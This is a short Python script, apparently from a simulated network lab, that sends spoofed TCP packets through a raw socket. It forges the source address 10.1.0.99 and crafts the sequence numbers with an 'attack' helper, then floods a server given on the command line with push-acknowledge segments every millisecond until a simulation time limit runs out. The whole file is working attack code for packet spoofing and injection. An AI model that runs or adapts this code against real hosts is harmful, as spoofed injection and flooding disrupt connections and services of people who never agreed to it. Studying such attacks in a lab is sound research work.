import socket
import sys
import time

from attack_utils import next_attack_seq
from config import PAYLOAD_SIZE, RECV_PORT, SIMULATION_END
from packet_utils import build_ethernet_header, build_ipv4_tcp

server_ip = sys.argv[1]
spoofed_ip = "10.1.0.99"
start_time = time.time()

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s.bind(("h2-eth0", 0))

eth_hdr = build_ethernet_header("00:04:00:00:02:01", "00:04:00:00:01:01", 0x0800)
payload = b"x" * PAYLOAD_SIZE
seq_state = {"seq": 0}

while time.time() - start_time < SIMULATION_END:
    seq = next_attack_seq(seq_state)
    ip_tcp_payload = build_ipv4_tcp(
        spoofed_ip, server_ip, 50000, RECV_PORT, "PA", seq, ack=1, payload=payload
    )
    pkt = eth_hdr + ip_tcp_payload
    s.sendall(pkt)
    time.sleep(0.001)

s.close()
